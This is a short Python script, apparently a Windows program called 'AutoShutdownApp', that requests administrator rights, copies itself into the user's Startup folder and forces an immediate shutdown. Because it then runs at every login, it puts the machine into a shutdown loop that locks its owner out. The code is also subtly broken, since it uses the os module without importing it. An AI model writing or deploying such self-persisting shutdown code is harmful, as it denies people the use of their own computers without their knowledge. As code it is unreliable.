import sys
import shutil
import ctypes

APP_NAME = "AutoShutdownApp.exe"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_to_startup():
    startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    current_path = os.path.abspath(sys.argv[0])
    target_path = os.path.join(startup_dir, APP_NAME)

    if not os.path.exists(target_path):
        shutil.copy(current_path, target_path)

def shutdown_pc():
    os.system("shutdown /s /t 1")

if __name__ == "__main__":
    startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    target_path = os.path.join(startup_dir, APP_NAME)

    if not os.path.exists(target_path):
        if not is_admin():
            # Request admin once
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 0)
            sys.exit()
        else:
            add_to_startup()
    
    shutdown_pc()
